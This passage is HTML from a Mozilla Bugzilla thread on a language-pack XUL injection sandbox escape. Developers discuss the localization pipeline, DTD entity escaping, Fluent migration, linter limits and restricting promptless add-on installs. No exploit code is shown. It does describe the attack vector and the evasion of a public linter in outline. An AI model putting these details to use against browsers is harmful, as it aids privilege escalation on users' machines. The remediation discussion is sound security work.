</div></div><div class="change-set" id="c22"><div class="comment" data-id="14004122" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-22" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_215498" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/c994610e952bd00dc460371293b6e3b7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_215498" id="a4554_537703"><a class="email disabled" href="/user_profile?user_id=215498" > <span class="fna">Axel Hecht [:Pike]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-22 01:53 PDT" data-time="1553244811">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-22" data-comment-id="14004122" data-ismarkdown="true" ><p>I&#39;ll split out my comments on status quo, and a follow-up on possible actions, to not drown those in a wall of text.</p>
<p>As many folks know little about our l10n system, here&#39;s a quick overview on how humans get access to the data in our language packs.</p>
<p>To commit directly to hg, localizers need scm-l10n, which is a level 1a access permission. These people have their contributions thoroughly reviewed technically before granting access. As Dan noted, this is the same path as someone committing rogue C++ code. There are a few folks left in this scheme, but the bulk of our Firefox translations comes through a webtool, pontoon.</p>
<p>On Pontoon, people start out as contributors, and their work isn&#39;t committed to VCS without an individual with higher rights having approved them. After a while, we elevate their privileges to also be able to approve translations.</p>
<p>Once translations are in hg (<a href="https://hg.mozilla.org/l10n-central" rel="nofollow">https://hg.mozilla.org/l10n-central</a>, indexed on <a href="https://dxr.mozilla.org/l10n-central/source/" rel="nofollow">https://dxr.mozilla.org/l10n-central/source/</a>), they&#39;re included in Nightly builds. For beta and beyond, the l10n team does a technical review, and lands known-good revisions in mozilla-beta (with tooling by releng). Thus the code that&#39;s going into the beta and release builds is pinned to versions that got technical review. These are the language packs that are uploaded by release automation to AMO.</p>
<p>That&#39;s a rather involved process, but it&#39;s also how we remedy the risks that our platform comes with.</p>
<p>In Firefox preferences, we offer to install language packs now. Those are restricted to the ones release engineering is building, and does&#39;t include language packs contributed in the wild.</p>
<p>The language packs in the wild go through the addons linter, I think Christopher Grebs is the best person to talk to about the details there. Code is <a href="https://github.com/mozilla/addons-linter/" rel="nofollow">https://github.com/mozilla/addons-linter/</a>, IIRC.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(l10n)</span></div></div></div><div class="change-set" id="c23"><div class="comment" data-id="14004176" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_215498" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/c994610e952bd00dc460371293b6e3b7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_215498" id="a4554_537703"><a class="email disabled" href="/user_profile?user_id=215498" > <span class="fna">Axel Hecht [:Pike]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-22 02:22 PDT" data-time="1553246554">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-23" data-comment-id="14004176" data-ismarkdown="true" ><p>Suggestions:</p>
<p>For our technology stack, the answer is Fluent. Our localizations are as safe as the code that uses them, and we put all the learnings we have over the past 20 years into Fluent. Including a DOM creation logic that works on a whitelist of content. That said, even then you could write code that reads a string from localized content, and then does all kinds of tricks to circumvent our innerHTML protections, and shoot ourselves in the foot. Which goes to Dan&#39;s point earlier, don&#39;t assume that strings from l10n are safe, as a general engineering practice. Even more so perhaps with Fluent, because it&#39;s safe by default.</p>
<p>The migration of Firefox on to Fluent could happen quicker, but for that it probably would need to make it through product planning to get priority. Right now, it&#39;s not listed as a priority. If you&#39;d like to help Romain to get it prioritized, that&#39;d be great. In the past, we&#39;ve delayed Fluent accepting the risks outlined in this bug. Notably, in December 2016 we (folks no longer at Mozilla) decided to pull Fluent out of the scope of Quantum.</p>
<p>As long as we have XUL documents loading DTDs, there&#39;s very little we can do. In particular, there&#39;s little we can do without breaking existing translations.</p>
<p>I agree with Dan that the main risk here comes from language packs generated in the wild and uploaded to AMO. As outlined above, our in-product hooks are already safe against those.</p>
<p>I have a few ideas:</p>
<p><strong>Squat out space</strong>: The attacker uploaded a modified German language pack. Maybe we should look for ways to block people to submit language packs that look like ours. We have almost 100 languages, and if we only leave room for Valencian or Tatar, we seriously limit the ability for attackers to social engineer users to install malicious langpacks.</p>
<p><strong>Harden the addons linter</strong>: That&#39;s a bit of an arms race, sadly. In particular hard to win, as the code of that linter is publicly available. Any attacker can just download the latest version and improve their obfuscation logic until they pass locally, and then upload. This is also tricky due to how Firefox is written. For DTDs, we know pretty well how the attack vectors look. But for .properties, we have a few of little or not-so-little js libraries that build stuff on top.</p>
</div></div><div class="change-set" id="c24"><div class="comment" data-id="14004195" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_130462" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/1c485cd7d6dce609989bbddc75f9c304?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_130462" id="a4554_537703"><a class="email " href="/user_profile?user_id=130462" > <span class="fna">Francesco Lodolo [:flod]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-22 02:39 PDT" data-time="1553247571">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-24" data-comment-id="14004195" data-ismarkdown="true" ><p>One additional note: I believe we&#39;re relying on the promptLess approach to add language packs when users ask to switch languages in Preferences (from 65)[1]. If we make changes to this, we should really make sure that the experience is still usable.</p>
<p>[1] As pike already wrote, we only install language packs generated by Mozilla</p>
</div></div><div class="change-set" id="c25"><div class="comment" data-id="14004249" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a4554_537703"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-22 03:20 PDT" data-time="1553250024">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-25" data-comment-id="14004249" data-ismarkdown="true" ><p>(In reply to Kris Maglione [:kmag] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c21" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #21</a>)</p>
<blockquote>
<p>Shorter term than Fluent, we could also probably make a push to get rid of our remaining entities that have non-CDATA content and remove our hacks to process them in the weird way we currently do. There aren&#39;t that many entities that currently rely on them:</p>
<p><a href="https://searchfox.org/mozilla-central/search?q=%3C%5Ba-z%5D&amp;case=true&amp;regexp=true&amp;path=.dtd" rel="nofollow">https://searchfox.org/mozilla-central/search?q=%3C%5Ba-z%5D&amp;case=true&amp;regexp=true&amp;path=.dtd</a></p>
</blockquote>
<p>Not sure I understand the implication. The idea is to disallow localized bits not to contain any markup at all? AFAIU we can&#39;t have that, hence the idea to sanitize above.</p>
</div></div><div class="change-set" id="c26"><div class="comment" data-id="14004810" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a4554_537703"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-22 08:06 PDT" data-time="1553267205">3 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1538007&amp;comment_id=14004810"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-26" data-comment-id="14004810" data-ismarkdown="true" ><p>I&#39;ll note that the sandbox escape here is only possible using DTDs sourced from privileged content.</p>
<p>The about:telemetry example from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c0" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #0</a> won&#39;t work on nightly after the patch in <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1523741">https://bugzilla.mozilla.org/show_bug.cgi?id=1523741</a> is finished up and lands. Although :kmag&#39;s link in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c21" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #21</a> has 200+ hits, most of them don&#39;t fit this bill either (e.g. netError is only loaded in unprivileged docs). We could fix up the remaining hits in browser.dtd and then pretty easily enforce that the standard set of [&amp;&lt;&gt;&#39;&quot;] things in DTDs loaded in the parent process get escaped.</p>
<p>This should be much less work than converting all of these, esp. because we apparently need more fluent changes to convert neterror to fluent (cf. <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1484955#c3">https://bugzilla.mozilla.org/show_bug.cgi?id=1484955#c3</a> ).</p>
</div></div><div class="change-set" id="c27"><div class="comment" data-id="14005004" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_106098" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/06a624a82dd4430f86e9a67b300eecb3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_106098" id="a4554_537703"><a class="email " href="/user_profile?user_id=106098" > <span class="fna">Kris Maglione [:kmag]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-22 09:13 PDT" data-time="1553271235">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-27" data-comment-id="14005004" data-ismarkdown="true" ><p>(In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c25" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #25</a>)</p>
<blockquote>
<p>Not sure I understand the implication. The idea is to disallow localized bits not to contain any markup at all? AFAIU we can&#39;t have that, hence the idea to sanitize above.</p>
</blockquote>
<p>That&#39;s the idea, yes. That&#39;s the way entities in XML work everywhere but in XUL documents. The only thing that&#39;s preventing us from doing it now is that we still have entities that rely on being able to include markup.</p>
</div></div><div class="change-set" id="c28"><div class="comment" data-id="14005060" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a4554_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-22 09:37 PDT" data-time="1553272630">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-28" data-comment-id="14005060" data-ismarkdown="true" ><p>Note: This was from Niklas Baumstark&#39;s pwn2own 2019 entry.</p>
</div></div><div class="change-set" id="c29"><div class="comment" data-id="14005689" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_215498" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/c994610e952bd00dc460371293b6e3b7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_215498" id="a4554_537703"><a class="email disabled" href="/user_profile?user_id=215498" > <span class="fna">Axel Hecht [:Pike]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-22 14:16 PDT" data-time="1553289373">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-29" data-comment-id="14005689" data-ismarkdown="true" ><p>(In reply to Kris Maglione [:kmag] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c27" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #27</a>)</p>
<blockquote>
<p>That&#39;s the way entities in XML work everywhere but in XUL documents.</p>
</blockquote>
<p>Can you clarify on this? IIRC, markup in entities is just plain standard XML.</p>
</div></div><div class="change-set" id="c30"><div class="comment" data-id="14005771" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_106098" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/06a624a82dd4430f86e9a67b300eecb3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_106098" id="a4554_537703"><a class="email " href="/user_profile?user_id=106098" > <span class="fna">Kris Maglione [:kmag]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-22 15:03 PDT" data-time="1553292200">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-30" data-comment-id="14005771" data-ismarkdown="true" ><p>(In reply to Axel Hecht [:Pike] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c29" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #29</a>)</p>
<blockquote>
<p>(In reply to Kris Maglione [:kmag] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c27" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #27</a>)</p>
<blockquote>
<p>That&#39;s the way entities in XML work everywhere but in XUL documents.</p>
</blockquote>
<p>Can you clarify on this? IIRC, markup in entities is just plain standard XML.</p>
</blockquote>
<p>You appear to be correct. I&#39;m trying to remember exactly what special treatment we give XML being parsed for XUL documents, in that case...</p>
<p>Regardless, we have the ability to change our Expat driver to forbid markup in entities from external DTDs when parsing markup for system-privileged documents. We would just first need to fix any existing DTDs that rely on it.</p>
</div></div><div class="change-set" id="c31"><div class="comment" data-id="14008057" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_434339" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/9a0a16bc1cb5b0144e373deb8e357804?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_434339" id="a4554_537703"><a class="email disabled" href="/user_profile?user_id=434339" > <span class="fna">Paul Theriault [:pauljt] (no longer reading bugmail)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-24 23:23 PDT" data-time="1553495034">3 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1538007&amp;comment_id=14008057"
     title="2 revisions">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-31" data-comment-id="14008057" data-ismarkdown="true" ><p>(In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c3" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #3</a>)</p>
<blockquote>
<p>mozAddonManager needs to die for sure (look at the conniptions WebExtensions code goes through keeping useful extensions away from that site for fear that API will be abused). Also users assume language packs are safe (&quot;it&#39;s just text, right?&quot;) although they never have been and were treated as fully privileged legacy addons in the past for good reason.</p>
</blockquote>
<p>Just pondering <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538008" title="RESOLVED FIXED - [ ZDI-CAN-8375] UXSS priv-esc via sync (install arbitrary extensions &amp; set arbitrary preferences)">bug 1538008</a> which stems basically from the same problem. In that bug there was discussion of isolating the domain (accounts.firefox.com) to prevent access to the API. Just mentioning it here for completeness - maybe we want to follow the same solution for both. (I don&#39;t know if isolation privileged origins is an option for this bug though, especially not when we include remote js on AMO still - <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1380537" title="RESOLVED INVALID - about:addons (Get Add-ons) triggers Google Analytics tracking in discovery panel">bug 1380537</a>).</p>
</div></div><div class="change-set" id="c32"><div class="comment" data-id="14010233" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_106098" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/06a624a82dd4430f86e9a67b300eecb3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_106098" id="a4554_537703"><a class="email " href="/user_profile?user_id=106098" > <span class="fna">Kris Maglione [:kmag]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-25 11:29 PDT" data-time="1553538574">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-32" data-comment-id="14010233" data-ismarkdown="true" ><p>(In reply to Paul Theriault [:pauljt] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c31" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #31</a>)</p>
<blockquote>
<p>Just pondering <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538008" title="RESOLVED FIXED - [ ZDI-CAN-8375] UXSS priv-esc via sync (install arbitrary extensions &amp; set arbitrary preferences)">bug 1538008</a> which stems basically from the same problem. In that bug there was discussion of isolating the domain (accounts.firefox.com) to prevent access to the API.</p>
</blockquote>
<p>The plan for mozAddonManager is to limit the promptless behavior to the discovery pane, which is loaded in about:addons. That unfortunately currently runs in the parent process, but can easily be segregated to its own process when it&#39;s migrated to an OOP browser.</p>
<p>I&#39;d also really like to limit that behavior to listed add-ons from AMO.</p>
</div></div><div class="change-set" id="a508868_537703"><div class="change" id="aa508868_537703">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a508868_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_537703" id="a508868_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a508868_537703"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a508868_537703">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a508868_537703">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-27 11:50 PDT" data-time="1553712611">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Parent process should prompt when installing a language pack"
   href="/show_bug.cgi?id=1539590">1539590</a></div></div></div><div class="change-set" id="a509203_537703"><div class="change" id="aa509203_537703">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a509203_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_537703" id="a509203_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a509203_537703"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a509203_537703">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a509203_537703">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-27 11:55 PDT" data-time="1553712946">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED WONTFIX - Remove special navigator.mozAddonManager API from addons.mozilla.org"
   href="/show_bug.cgi?id=1539591">1539591</a></div></div></div><div class="change-set" id="a509310_537703"><div class="change" id="aa509310_537703">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a509310_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_537703" id="a509310_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a509310_537703"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a509310_537703">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a509310_537703">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-27 11:57 PDT" data-time="1553713053">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Convert aboutTelemetry.dtd to use Fluent instead"
   href="/show_bug.cgi?id=1523741">1523741</a></div></div></div><div class="change-set" id="c33"><div class="comment" data-id="14015504" data-no="33"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-33" role="presentation">
      <tr>
